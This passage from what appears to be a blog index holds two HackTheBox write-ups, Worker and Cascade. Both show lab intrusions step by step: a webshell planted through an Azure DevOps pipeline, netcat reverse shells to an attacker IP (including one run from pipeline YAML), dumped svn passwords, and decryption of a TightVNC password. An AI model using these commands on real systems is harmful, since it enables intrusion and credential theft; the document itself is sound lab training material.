\u0026#34;Copy-Site.ps1\u0026#34; Start-Process powershell.exe -Credential $Credential -ArgumentList (\u0026#34;-file $args\u0026#34;) Let\u0026rsquo;s check other vhosts └─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.10.203 -H \u0026#39;Host: FUZZ.worker.htb\u0026#39; --hh 703 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.203/ Total requests: 100000 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000296: 200 170 L 542 W 6495 Ch \u0026#34;alpha\u0026#34; 000007691: 200 355 L 1408 W 16045 Ch \u0026#34;story\u0026#34; 000022566: 401 85 L 329 W 20028 Ch \u0026#34;devops\u0026#34; 000023339: 200 397 L 1274 W 14803 Ch \u0026#34;cartoon\u0026#34; 000023462: 200 111 L 398 W 4971 Ch \u0026#34;lens\u0026#34; 000024714: 200 368 L 1173 W 14588 Ch \u0026#34;dimension\u0026#34; 000037212: 400 6 L 26 W 334 Ch \u0026#34;*\u0026#34; 000071250: 200 274 L 871 W 10134 Ch \u0026#34;twenty\u0026#34; Add all of them to /etc/hosts\n10.10.10.203 worker.htb alpha.worker.htb story.worker.htb devops.worker.htb cartoon.worker.htb lens.worker.htb dimension.worker.htb twenty.worker.htb dimension.worker.htb\nIt shows other vhosts If we visit devops.worker.htb we have to authenticate Using the creds nathen:wendel98 from svn works We have repos and pipelines for vhosts we saw in dimension.worker.htb We can check any pipeline Looks like they copy source files from build to w:\\sites\\\u0026lt;repository_name\u0026gt;.worker.htb We can click Queue and start the build The plan is to upload a webshell and start the build But we can\u0026rsquo;t upload files directly to master branch We can try creating a new branch and build it Now let\u0026rsquo;s build it After a few minutes we have our webshell Let\u0026rsquo;s get the reverse shell First we download nc via powershell -c iwr 10.10.16.9/nc64.exe -outfile \\programdata\\nc.exe Then c:\\programdata\\nc.exe 10.10.16.9 6666 -e cmd.exe User c:\\users c:\\Users\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is 32D6-9041 Directory of c:\\Users 2020-07-07 17:53 \u0026lt;DIR\u0026gt; . 2020-07-07 17:53 \u0026lt;DIR\u0026gt; .. 2020-03-28 15:59 \u0026lt;DIR\u0026gt; .NET v4.5 2020-03-28 15:59 \u0026lt;DIR\u0026gt; .NET v4.5 Classic 2020-08-18 00:33 \u0026lt;DIR\u0026gt; Administrator 2020-03-28 15:01 \u0026lt;DIR\u0026gt; Public 2020-07-22 01:11 \u0026lt;DIR\u0026gt; restorer 2020-07-08 19:22 \u0026lt;DIR\u0026gt; robisl 0 File(s) 0 bytes 8 Dir(s) 10�486�476�800 bytes free whoami c:\\\u0026gt;whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled c:\\\u0026gt;whoami /groups whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ==================================== ================ ============ ================================================== Mandatory Label\\High Mandatory Level Label S-1-16-12288 Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group BUILTIN\\IIS_IUSRS Alias S-1-5-32-568 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group Unknown SID type S-1-5-82-0 Mandatory group, Enabled by default, Enabled group We have SeImpersonatePrivilege We can run Potato and get the root But I will skip it Let\u0026rsquo;s also check W: drive we saw in pipelines We can run wmic logicaldisk get deviceid, volumename, description Or powershell -c get-psdrive -psprovider filesystem c:\\\u0026gt;powershell -c get-psdrive -psprovider filesystem powershell -c get-psdrive -psprovider filesystem Name Used (GB) Free (GB) Provider Root CurrentLocation ---- --------- --------- -------- ---- --------------- C 19,63 9,77 FileSystem C:\\ W 2,52 17,48 FileSystem W:\\ Let\u0026rsquo;s navigate there c:\\\u0026gt;w: w: W:\\\u0026gt;dir dir Volume in drive W is Work Volume Serial Number is E82A-AEA8 Directory of W:\\ 2020-06-16 18:59 \u0026lt;DIR\u0026gt; agents 2020-03-28 15:57 \u0026lt;DIR\u0026gt; AzureDevOpsData 2020-04-03 11:31 \u0026lt;DIR\u0026gt; sites 2020-06-20 16:04 \u0026lt;DIR\u0026gt; svnrepos 0 File(s) 0 bytes 4 Dir(s) 18�768�273�408 bytes free We have sites folder we saw Other folder have nothing interesting Except for svnrepos W:\\\u0026gt;dir svnrepos dir svnrepos Volume in drive W is Work Volume Serial Number is E82A-AEA8 Directory of W:\\svnrepos 2020-06-20 16:04 \u0026lt;DIR\u0026gt; . 2020-06-20 16:04 \u0026lt;DIR\u0026gt; .. 2020-06-20 11:29 \u0026lt;DIR\u0026gt; www 0 File(s) 0 bytes 3 Dir(s) 18�768�273�408 bytes free W:\\\u0026gt;dir svnrepos\\www dir svnrepos\\www Volume in drive W is Work Volume Serial Number is E82A-AEA8 Directory of W:\\svnrepos\\www 2020-06-20 11:29 \u0026lt;DIR\u0026gt; . 2020-06-20 11:29 \u0026lt;DIR\u0026gt; .. 2020-06-20 15:30 \u0026lt;DIR\u0026gt; conf 2020-06-20 15:52 \u0026lt;DIR\u0026gt; db 2020-06-20 11:29 2 format 2020-06-20 11:29 \u0026lt;DIR\u0026gt; hooks 2020-06-20 11:29 \u0026lt;DIR\u0026gt; locks 2020-06-20 11:29 251 README.txt 2 File(s) 253 bytes 6 Dir(s) 18�768�273�408 bytes free The conf folder contains passwd file W:\\svnrepos\\www\u0026gt;dir conf dir conf Volume in drive W is Work Volume Serial Number is E82A-AEA8 Directory of W:\\svnrepos\\www\\conf 2020-06-20 15:30 \u0026lt;DIR\u0026gt; . 2020-06-20 15:30 \u0026lt;DIR\u0026gt; .. 2020-06-20 11:29 1�112 authz 2020-06-20 11:29 904 hooks-env.tmpl 2020-06-20 15:27 1�031 passwd 2020-04-04 20:51 4�454 svnserve.conf 4 File(s) 7�501 bytes 2 Dir(s) 18�768�273�408 bytes free W:\\svnrepos\\www\\conf\u0026gt;type passwd type passwd ### This file is an example password file for svnserve. ### Its format is similar to that of svnserve.conf. As shown in the ### example below it contains one section labelled [users]. ### The name and password for each user follow, one account per line. [users] nathen = wendel98 nichin = fqerfqerf nichin = asifhiefh noahip = player nuahip = wkjdnw oakhol = bxwdjhcue owehol = supersecret paihol = painfulcode parhol = gitcommit pathop = iliketomoveit pauhor = nowayjose payhos = icanjive perhou = elvisisalive peyhou = ineedvacation phihou = pokemon quehub = pickme quihud = kindasecure rachul = guesswho raehun = idontknow ramhun = thisis ranhut = getting rebhyd = rediculous reeinc = iagree reeing = tosomepoint reiing = isthisenough renipr = dummy rhiire = users riairv = canyou ricisa = seewhich robish = onesare robisl = wolves11 robive = andwhich ronkay = onesare rubkei = the rupkel = sheeps ryakel = imtired sabken = drjones samken = aqua sapket = hamburger sarkil = friday We see nathen user with the password we used Also we have another user from the box robisl:wolves11 If we check his groups, he can winrm Let\u0026rsquo;s try his creds W:\\svnrepos\\www\\conf\u0026gt;net user robisl net user robisl User name robisl Full Name Robin Islip Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 2020-04-05 21:27:26 Password expires Never Password changeable 2020-04-05 21:27:26 Password required No User may change password No Workstations allowed All Logon script User profile Home directory Last logon 2020-08-03 12:41:02 Logon hours allowed All Local Group Memberships *Production *Remote Management Use Global Group memberships *None The command completed successfully. And have our shell Root Nothing interesting Let\u0026rsquo;s check devops.worker.htb using robisl\u0026rsquo;s creds It worked and he has different project The project has no pipelines Single repo And no branches But robisl is a Build Adminsitrator So we can create a pipeline So the yml file will look like this # Starter pipeline # Start with a minimal pipeline that you can customize to build and deploy your code. # Add steps that build, run tests, deploy, and more: # https://aka.ms/yaml trigger: - master pool: \u0026#39;Setup\u0026#39; steps: - script: | whoami type c:\\users\\administrator\\desktop\\root.txt displayName: \u0026#39;Rooted\u0026#39; The reason we had to change pool setting to Setup is because Default pool doesn\u0026rsquo;t exist If we check Agent Pools we only have Setup pool Now we can Save and Run And we have to create a new branch again Since we don\u0026rsquo;t have permissions to push directly to master branch The build will start After few minutes check the Task (In my case Rooted) and get the flag Note that we can also perform rce and get the reverse shell Modify the pipeline yml Save it and run # Starter pipeline # Start with a minimal pipeline that you can customize to build and deploy your code. # Add steps that build, run tests, deploy, and more: # https://aka.ms/yaml trigger: - master pool: \u0026#39;Setup\u0026#39; steps: - script: | c:\\programdata\\nc.exe 10.10.16.9 7777 -e cmd.exe displayName: \u0026#39;Reverse Shell\u0026#39; Potato Check 0xdf\u0026rsquo;s solution ","date":"September 8, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/worker/images/worker.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/worker/","summary":"Worker Enumeration nmap └─$ nmap -Pn -p- 10.10.10.203 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 18:39 BST Nmap scan report for 10.10.10.203 (10.10.10.203) Host is up (0.098s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 3690/tcp open svn 5985/tcp open wsman └─$ nmap -Pn -p80,3690,5985 -sC -sV 10.10.10.203 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 18:42 BST Nmap scan report for 10.","tags":["HTB","svn","vhosts","wfuzz","azure","azure-devops","devops","pipeline","git","webshell","upload","aspx","evil-winrm","azure-pipelines","potato","roguepotato","juicypotato","cicd"],"title":"[HTB] Machine: Worker"},{"categories":null,"contents":"Cascade Enumeration nmap └─$ nmap -Pn -p- 10.10.10.182 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 20:29 BST Stats: 0:03:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 43.53% done; ETC: 20:36 (0:03:56 remaining) Nmap scan report for 10.10.10.182 (10.10.10.182) Host is up (0.093s latency). Not shown: 65525 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49170/tcp open unknown └─$ nmap -Pn -p53,88,135,389,445,636,3268,3269,5985 -sC -sV 10.10.10.182 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 20:33 BST Nmap scan report for 10.10.10.182 (10.10.10.182) Host is up (0.15s latency). PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-05 19:33:09Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-09-05T19:33:17 |_ start_date: 2023-09-05T19:28:19 |_clock-skew: -36s | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required smb └─$ smbclient -N -L //10.10.10.182 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.182 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available Foothold/User #1 rpcclient https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration └─$ rpcclient -U \u0026#39;\u0026#39; -N 10.10.10.182 rpcclient $\u0026gt; querydispinfo index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull Name: Adrian Turnbull Desc: (null) index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc Name: ArkSvc Desc: (null) index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson Name: Ben Hanson Desc: (null) index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc Name: BackupSvc Desc: (null) index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest Name: (null) Desc: Built-in account for guest access to the computer/domain index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman Name: David Burman Desc: (null) index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe Name: Edward Crowe Desc: (null) index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft Name: Ian Croft Desc: (null) index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen Name: Joseph Allen Desc: (null) index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand Name: John Goodhand Desc: (null) index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield Name: James Wakefield Desc: (null) index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson Name: Ryan Thompson Desc: (null) index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson Name: Stephanie Hickson Desc: (null) index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith Name: Steve Smith Desc: (null) index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util Name: Util Desc: (null) ldap └─$ ldapsearch -H ldap://10.10.10.182 -x -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingContexts: DC=cascade,DC=local namingContexts: CN=Configuration,DC=cascade,DC=local namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local namingContexts: DC=DomainDnsZones,DC=cascade,DC=local namingContexts: DC=ForestDnsZones,DC=cascade,DC=local # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 └─$ ldapsearch -H ldap://10.10.10.182 -x -b \u0026#34;DC=cascade,DC=local\u0026#34; ... Only users └─$ ldapsearch -H ldap://10.10.10.182 -x -b \u0026#34;DC=cascade,DC=local\u0026#34; \u0026#39;(objectClass=person)\u0026#39; # extended LDIF # # LDAPv3 # base \u0026lt;DC=cascade,DC=local\u0026gt; with scope subtree # filter: (objectClass=person) # requesting: ALL # # CascGuest, Users, cascade.local dn: CN=CascGuest,CN=Users,DC=cascade,DC=local objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: CascGuest ... # Ryan Thompson, Users, UK, cascade.local dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: Ryan Thompson sn: Thompson givenName: Ryan distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local instanceType: 4 whenCreated: 20200109193126.0Z whenChanged: 20200323112031.0Z displayName: Ryan Thompson uSNCreated: 24610 memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local uSNChanged: 295010 name: Ryan Thompson objectGUID:: LfpD6qngUkupEy9bFXBBjA== userAccountControl: 66048 badPwdCount: 0 codePage: 0 countryCode: 0 badPasswordTime: 132247339091081169 lastLogoff: 0 lastLogon: 132247339125713230 pwdLastSet: 132230718862636251 primaryGroupID: 513 objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA== accountExpires: 9223372036854775807 logonCount: 2 sAMAccountName: r.thompson sAMAccountType: 805306368 userPrincipalName: r.thompson@cascade.local objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local dSCorePropagationData: 20200126183918.0Z dSCorePropagationData: 20200119174753.0Z dSCorePropagationData: 20200119174719.0Z dSCorePropagationData: 20200119174508.0Z dSCorePropagationData: 16010101000000.0Z lastLogonTimestamp: 132294360317419816 msDS-SupportedEncryptionTypes: 0 cascadeLegacyPwd: clk0bjVldmE= ... Interesting entry cascadeLegacyPwd: clk0bjVldmE= for r.thompson Decode it from base64 r.thompson:rY4n5eva └─$ echo \u0026#34;clk0bjVldmE=\u0026#34; | base64 -d rY4n5eva Let\u0026rsquo;s test the creds for winrm We only have access to smb └─$ crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva SMB 10.10.10.182 5985 CASC-DC1 [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local) HTTP 10.10.10.182 5985 CASC-DC1 [*] http://10.10.10.182:5985/wsman WINRM 10.10.10.182 5985 CASC-DC1 [-] cascade.local\\r.thompson:rY4n5eva └─$ crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva SMB 10.10.10.182 445 CASC-DC1 [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) SMB 10.10.10.182 445 CASC-DC1 [+] cascade.local\\r.thompson:rY4n5eva Data share └─$ smbclient //10.10.10.182/Data -U \u0026#39;r.thompson%rY4n5eva\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; prompt off smb: \\\u0026gt; recurce on recurce: command not found smb: \\\u0026gt; recurse on smb: \\\u0026gt; mget * NT_STATUS_ACCESS_DENIED listing \\Contractors\\* NT_STATUS_ACCESS_DENIED listing \\Finance\\* NT_STATUS_ACCESS_DENIED listing \\Production\\* NT_STATUS_ACCESS_DENIED listing \\Temps\\* getting file \\IT\\Email Archives\\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (4.8 KiloBytes/sec) (average 4.8 KiloBytes/sec) getting file \\IT\\Logs\\Ark AD Recycle Bin\\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (2.5 KiloBytes/sec) (average 3.7 KiloBytes/sec) getting file \\IT\\Logs\\DCs\\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (7.9 KiloBytes/sec) (average 5.4 KiloBytes/sec) getting file \\IT\\Temp\\s.smith\\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (5.8 KiloBytes/sec) (average 5.5 KiloBytes/sec) smb: \\\u0026gt; exit Meeting_Notes_June_2018.html VNC Install.reg └─$ cat IT/Temp/s.smith/VNC\\ Install.reg Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC] [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC\\Server] \u0026#34;ExtraPorts\u0026#34;=\u0026#34;\u0026#34; \u0026#34;QueryTimeout\u0026#34;=dword:0000001e \u0026#34;QueryAcceptOnTimeout\u0026#34;=dword:00000000 \u0026#34;LocalInputPriorityTimeout\u0026#34;=dword:00000003 \u0026#34;LocalInputPriority\u0026#34;=dword:00000000 \u0026#34;BlockRemoteInput\u0026#34;=dword:00000000 \u0026#34;BlockLocalInput\u0026#34;=dword:00000000 \u0026#34;IpAccessControl\u0026#34;=\u0026#34;\u0026#34; \u0026#34;RfbPort\u0026#34;=dword:0000170c \u0026#34;HttpPort\u0026#34;=dword:000016a8 \u0026#34;DisconnectAction\u0026#34;=dword:00000000 \u0026#34;AcceptRfbConnections\u0026#34;=dword:00000001 \u0026#34;UseVncAuthentication\u0026#34;=dword:00000001 \u0026#34;UseControlAuthentication\u0026#34;=dword:00000000 \u0026#34;RepeatControlAuthentication\u0026#34;=dword:00000000 \u0026#34;LoopbackOnly\u0026#34;=dword:00000000 \u0026#34;AcceptHttpConnections\u0026#34;=dword:00000001 \u0026#34;LogLevel\u0026#34;=dword:00000000 \u0026#34;EnableFileTransfers\u0026#34;=dword:00000001 \u0026#34;RemoveWallpaper\u0026#34;=dword:00000001 \u0026#34;UseD3D\u0026#34;=dword:00000001 \u0026#34;UseMirrorDriver\u0026#34;=dword:00000001 \u0026#34;EnableUrlParams\u0026#34;=dword:00000001 \u0026#34;Password\u0026#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f \u0026#34;AlwaysShared\u0026#34;=dword:00000000 \u0026#34;NeverShared\u0026#34;=dword:00000000 \u0026#34;DisconnectClients\u0026#34;=dword:00000001 \u0026#34;PollingInterval\u0026#34;=dword:000003e8 \u0026#34;AllowLoopback\u0026#34;=dword:00000000 \u0026#34;VideoRecognitionInterval\u0026#34;=dword:00000bb8 \u0026#34;GrabTransparentWindows\u0026#34;=dword:00000001 \u0026#34;SaveLogToAllUsersPath\u0026#34;=dword:00000000 \u0026#34;RunControlInterface\u0026#34;=dword:00000001 \u0026#34;IdleTimeout\u0026#34;=dword:00000000 \u0026#34;VideoClasses\u0026#34;=\u0026#34;\u0026#34; \u0026#34;VideoRects\u0026#34;=\u0026#34;\u0026#34; Let\u0026rsquo;s crack the Password 6bcf2a4b6e5aca0f I followed the following post msf6 \u0026gt; irb [*] Starting IRB shell... [*] You are in the \u0026#34;framework\u0026#34; object irb: warn: can\u0026#39;t alias jobs from irb_jobs. \u0026gt;\u0026gt; fixedkey = \u0026#34;\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07\u0026#34; =\u0026gt; \u0026#34;\\x17Rk\\x06#NX\\a\u0026#34; \u0026gt;\u0026gt; require \u0026#39;rex/proto/rfb\u0026#39; =\u0026gt; true \u0026gt;\u0026gt; Rex::Proto::RFB::Cipher.decrypt [\u0026#34;6bcf2a4b6e5aca0f\u0026#34;].pack(\u0026#39;H*\u0026#39;), fixedkey =\u0026gt; \u0026#34;sT333ve2\u0026#34; Test with crackmapexec └─$ crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2 SMB 10.10.10.182 5985 CASC-DC1 [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local) HTTP 10.10.10.182 5985 CASC-DC1 [*] http://10.10.10.182:5985/wsman WINRM 10.10.10.182 5985 CASC-DC1 [+] cascade.local\\s.smith:sT333ve2 (Pwn3d!) Let\u0026rsquo;s get winrm User #2 whoami *Evil-WinRM* PS C:\\Users\\s.smith\\Documents\u0026gt; net user s.smith /domain User name s.smith Full Name Steve Smith Comment User\u0026#39;s comment Country code 000 (System Default) Account active Yes Account expires Never Password last set 1/28/2020 8:58:05 PM Password expires Never Password changeable 1/28/2020 8:58:05 PM Password required Yes User may change password No Workstations allowed All Logon script MapAuditDrive.vbs User profile Home directory Last logon 1/29/2020 12:26:39 AM Logon hours allowed All Local Group Memberships *Audit Share *IT *Remote Management Use Global Group memberships *Domain Users The command completed successfully. *Evil-WinRM* PS C:\\Users\\s.smith\\Documents\u0026gt; whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled *Evil-WinRM* PS C:\\Users\\s.smith\\Documents\u0026gt; whoam /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================== =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group CASCADE\\Data Share Alias S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\Audit Share Alias S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\IT Alias S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group CASCADE\\Remote Management Users Alias S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 We have another user arksvc *Evil-WinRM* PS C:\\Users\u0026gt; ls Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 3/25/2020 11:17 AM Administrator d----- 1/28/2020 11:37 PM arksvc d-r--- 7/14/2009 5:57 AM Public d----- 1/15/2020 10:22 PM s.smith Let\u0026rsquo;s check Audit Share group *Evil-WinRM* PS C:\\Shares\u0026gt; net localgroup \u0026#34;Audit Share\u0026#34; Alias name Audit Share Comment \\\\Casc-DC1\\Audit$ Members ------------------------------------------------------------------------------- s.smith The command completed successfully. *Evil-WinRM* PS C:\\Shares\u0026gt; ls \\\\Casc-DC1\\Audit$ Directory: \\\\Casc-DC1\\Audit$ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 1/28/2020 9:40 PM DB d----- 1/26/2020 10:25 PM x64 d----- 1/26/2020 10:25 PM x86 -a---- 1/28/2020 9:46 PM 13312 CascAudit.exe -a---- 1/29/2020 6:00 PM 12288 CascCrypto.dll -a---- 1/28/2020 11:29 PM 45 RunAudit.bat -a---- 10/27/2019 6:38 AM 363520 System.Data.SQLite.dll -a---- 10/27/2019 6:38 AM 186880 System.Data.SQLite.EF6.dll Let\u0026rsquo;s download it via smb └─$ smbclient -U \u0026#39;s.smith%sT333ve2\u0026#39; //10.10.10.182/Audit$ Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; prompt OFF smb: \\\u0026gt; recurse on smb: \\\u0026gt; mget * getting file \\CascAudit.exe of size 13312 as CascAudit.exe (22.8 KiloBytes/sec) (average 22.8 KiloBytes/sec) getting file \\CascCrypto.dll of size 12288 as CascCrypto.dll (26.0 KiloBytes/sec) (average 24.2 KiloBytes/sec) getting file \\RunAudit.bat of size 45 as RunAudit.bat (0.1 KiloBytes/sec) (average 14.7 KiloBytes/sec) getting file \\System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (135.8 KiloBytes/sec) (average 88.0 KiloBytes/sec) getting file \\System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (177.4 KiloBytes/sec) (average 105.2 KiloBytes/sec) getting file \\DB\\Audit.db of size 24576 as DB/Audit.db (51.4 KiloBytes/sec) (average 100.9 KiloBytes/sec) getting file \\x64\\SQLite.Interop.dll of size 1639936 as x64/SQLite.Interop.dll (400.5 KiloBytes/sec) (average 223.0 KiloBytes/sec) getting file \\x86\\SQLite.Interop.dll of size 1246720 as x86/SQLite.Interop.dll (557.2 KiloBytes/sec) (average 283.9 KiloBytes/sec) smb: \\\u0026gt; DB/RunAudit.bat └─$ cat RunAudit.bat CascAudit.exe \u0026#34;\\\\CASC-DC1\\Audit$\\DB\\Audit.db\u0026#34; Audit.db └─$ file Audit.db Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60 └─$ sqlite3 Audit.db SQLite version 3.42.0 2023-05-16 12:36:15 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .tables DeletedUserAudit Ldap Misc sqlite\u0026gt; select * from DeletedUserAudit; 6|test|Test DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local 7|deleted|deleted guy DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local 9|TempAdmin|TempAdmin DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local sqlite\u0026gt; select * from Ldap; 1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local sqlite\u0026gt; select * from Misc; sqlite\u0026gt; CascAudit.exe └─$ file CascAudit.exe CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections Let\u0026rsquo;s analyse it with dnspy We can debug it so it will decrypt the password for us We have our creds arksvc:w3lc0meFr31nd └─$ crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd SMB 10.10.10.182 5985 CASC-DC1 